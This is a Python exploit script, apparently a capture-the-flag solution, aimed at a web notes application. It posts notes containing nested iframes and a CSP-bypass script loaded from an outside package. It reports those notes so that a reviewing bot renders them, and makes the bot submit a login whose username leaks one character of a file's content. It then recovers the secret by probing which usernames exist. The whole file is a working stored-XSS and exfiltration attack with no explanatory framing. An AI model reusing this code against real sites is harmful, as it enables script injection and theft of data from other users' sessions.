#!/usr/bin/env python3

import requests
import json
import time

URL = "http://10.113.184.121:10082/"
# URL = "http://localhost:10082/"

NONCE = "gogomowmi_2"  # can be at most 15, originally `nonce`
USERNAME = "qwe85"
PASSWORD = USERNAME  # originally `aaaaa`
SESSION = requests.Session()


def login(username, password, session=None):
    # print(username, password)
    if session is None:
        r = requests.post(
            URL + "login", data={"username": username, "password": password}
        )
    else:
        r = SESSION.post(
            URL + "login", data={"username": username, "password": password}
        )

    if "Invalid username or password!" not in r.text:
        return False

    # print(r.text)

    return True


def get_notes():
    r = SESSION.get(URL + "api/notes/all")
    return json.loads(r.text)


def create_note(title, content):
    r = SESSION.post(URL + "api/notes", json={"title": title, "content": content})
    return json.loads(r.text)["id"]


def report(note_id, author):
    r = SESSION.post(URL + "report", data={"note_id": note_id, "author": author})
    return r


def check_user_existence(username):
    return login(username, NONCE)


def script_to_html(script):
    return f"<iframe srcdoc=\"<br csp='{script}'><script src='https://unpkg.com/csp-bypass/dist/sval-classic.js'></script>\"></iframe>"


def index_to_username(index):
    return (
        f"{index}_{NONCE}_"
        + "${top.a.b.note.children[7].textContent.charCodeAt("
        + f"{index}"
        + ")}"
    )


def note_id_to_iframe(note_id):
    return f"<iframe src='/note?id={note_id}&author={USERNAME}'></iframe>"


def register_index_nonce_ascii_at(index):
    # g1_id = create_note(
    #     f"{NONCE}_{index}_g1",
    #     script_to_html(f"setTimeout(()=>top.a.b.noteList.children[0].click(),0)"),
    # )

    g2_id = create_note(
        f"{NONCE}_{index}_g2",
        script_to_html(
            "setTimeout(()=>top.a.c[&quot;login-form&quot;].username.value=`"
            + index_to_username(index)
            + "`,1000)"
        ),
    )

    g3_id = create_note(
        f"{NONCE}_{index}_g3",
        script_to_html(
            "setTimeout(()=>top.a.c[&quot;login-form&quot;].password.value=`"
            + index_to_username(index)
            + "`,1000)"
        ),
    )

    g4_id = create_note(
        f"{NONCE}_{index}_g4",
        script_to_html("setTimeout(()=>top.a.c[&quot;login-form&quot;].submit(),2000)"),
    )

    note2_id = create_note(
        f"{NONCE}_{index}_note2",
        '<iframe srcdoc="'
        + note_id_to_iframe(g3_id)
        + note_id_to_iframe(g4_id)
        + '"></iframe>',
    )

    note_1_id = create_note(
        f"{NONCE}_{index}_note1",
        '<iframe srcdoc="'
        + note_id_to_iframe(note2_id)
        + note_id_to_iframe(g2_id)
        + '"></iframe>',
    )

    # note0_id = create_note(
    #     f"{NONCE}_{index}_note0",
    #     '<iframe srcdoc="'
    #     + note_id_to_iframe(note_1_id)
    #     + note_id_to_iframe(g1_id)
    #     + '"></iframe>',
    # )

    root_id = create_note(
        f"{NONCE}_{index}_root",
        "<iframe name=\"a\" srcdoc=\"<iframe name='b' src='/note?id=/app/Dockerfile'></iframe><iframe name='c' src='/login'></iframe>"
        + note_id_to_iframe(note_1_id)
        + '"></iframe>',
    )

    report(root_id, USERNAME)
    return root_id


# f"{index}_{NONCE}_{ascii_code}"
def check_flag_at(index):
    for i in range(32, 127):
        # login(f"{index}_{NONCE}_{i}", f"nnnnn")
        if login(f"{index}_{NONCE}_{i}", f"nnnnn"):
            return chr(i)
    return None


def main():
    print(login(USERNAME, PASSWORD, SESSION))  # Register
    print(login(USERNAME, PASSWORD, SESSION))  # Login

    for i in range(64):
        print(register_index_nonce_ascii_at(i))

    time.sleep(5)

    flag = ""
    for i in range(64):
        flag += check_flag_at(i)
        print(flag)


if __name__ == "__main__":
    main()
